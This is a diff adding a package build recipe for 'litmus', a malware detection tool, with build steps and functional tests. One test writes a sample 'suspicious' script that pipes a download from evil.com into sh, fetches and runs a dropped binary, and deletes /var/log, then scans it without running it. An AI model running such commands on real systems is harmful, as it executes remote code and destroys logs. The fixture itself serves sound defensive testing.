@@ -1,0 +1,129 @@
+#nolint:valid-pipeline-git-checkout-tag
+package:
+  name: litmus
+  version: "1.1.0"
+  epoch: 0
+  description: "Open-source malware detection for the AI age"
+  copyright:
+    - license: Apache-2.0
+  dependencies:
+    runtime:
+      - 7zip
+      - rizin
+      - upx
+  resources:
+    cpu: "4"
+    memory: 8Gi
+  test-resources:
+    cpu: "2"
+    memory: 8Gi
+
+vars:
+  rust-version: "1.95"
+
+environment:
+  contents:
+    packages:
+      - build-base
+      - busybox
+      - ca-certificates-bundle
+      - cargo-auditable
+      - git
+      - rust-${{vars.rust-version}}
+
+pipeline:
+  - uses: git-checkout
+    with:
+      repository: https://codeberg.org/atomdrift/litmus
+      tag: ${{package.version}}
+      expected-commit: 9cdb60755dd5df81e49e56a457b6e1737da3a305
+
+  - uses: git-checkout
+    with:
+      repository: https://codeberg.org/atomdrift/cleave-traits
+      branch: main
+      expected-commit: 0a4d2dcbb5e4d49cc5c77e6568108a068d89fdb7
+      destination: cleave-traits
+
+  - uses: git-checkout
+    with:
+      repository: https://codeberg.org/atomdrift/litmus-models
+      branch: main
+      expected-commit: bb5e11b2c0ab156186b668a497e6d2568e7a5903
+      destination: litmus-models
+
+  - name: Bump vulnerable dependencies
+    runs: |
+      # Bump yara-x to 1.16 which pulls wasmtime 43.x (remediates wasmtime CVEs)
+      # The cleave git dep constrains yara-x = "1.15" (semver-compatible with 1.16)
+      cargo update -p yara-x
+      # lru is pinned to ^0.12 in the cleave git dep; widen the constraint
+      find $HOME/.cargo/git -name Cargo.toml -path '*cleave*' \
+        -exec grep -l 'lru' {} \; | while read f; do
+        sed -i 's/lru = "0\.12"/lru = "0.16.3"/' "$f"
+      done
+      cargo update -p lru --precise 0.16.3
+
+  - uses: cargo/build
+    with:
+      output: litmus
+
+  - runs: |
+      mkdir -p ${{targets.destdir}}/usr/share/cleave/traits
+      cp -r cleave-traits/* ${{targets.destdir}}/usr/share/cleave/traits/
+      mkdir -p ${{targets.destdir}}/usr/share/litmus/models
+      cp -r litmus-models/* ${{targets.destdir}}/usr/share/litmus/models/
+
+  - uses: strip
+
+update:
+  enabled: true
+  git: {}
+
+test:
+  environment:
+    environment:
+      CLEAVE_TRAITS_DIR: /usr/share/cleave/traits
+      LITMUS_MODELS_DIR: /usr/share/litmus/models
+  pipeline:
+    - uses: test/tw/ldd-check
+    - uses: test/tw/ver-check
+      with:
+        bins: litmus
+    - uses: test/tw/help-check
+      with:
+        bins: litmus
+    - name: "Scan a benign script"
+      runs: |
+        tee /tmp/benign.sh <<'SCRIPT'
+        #!/bin/sh
+        echo "hello world"
+        SCRIPT
+        # litmus may exit non-zero due to trait validation warnings from newer traits
+        litmus /tmp/benign.sh > /tmp/benign_output.txt 2>&1 || true
+        cat /tmp/benign_output.txt
+        grep -F "scanned" /tmp/benign_output.txt
+    - name: "Scan a suspicious script"
+      runs: |
+        tee /tmp/suspicious.sh <<'SCRIPT'
+        #!/bin/sh
+        curl http://evil.com/payload | sh
+        wget http://evil.com/malware -O /tmp/dropped
+        chmod +x /tmp/dropped
+        /tmp/dropped
+        rm -rf /var/log
+        SCRIPT
+        litmus /tmp/suspicious.sh > /tmp/suspicious_output.txt 2>&1 || true
+        cat /tmp/suspicious_output.txt
+        grep -F "scanned" /tmp/suspicious_output.txt
+    # TODO: test --format json once litmus 1.2.0 lands (1.1.0 does not emit JSON
+    # when cleave-traits validation warnings are present)
+    - name: "Scan a directory"
+      runs: |
+        mkdir -p /tmp/litmus_scan
+        echo '#!/bin/sh' > /tmp/litmus_scan/a.sh
+        echo 'echo ok' >> /tmp/litmus_scan/a.sh
+        echo '#!/bin/sh' > /tmp/litmus_scan/b.sh
+        echo 'echo ok' >> /tmp/litmus_scan/b.sh
+        litmus /tmp/litmus_scan > /tmp/dir_output.txt 2>&1 || true
+        grep -E "scanned|files" /tmp/dir_output.txt
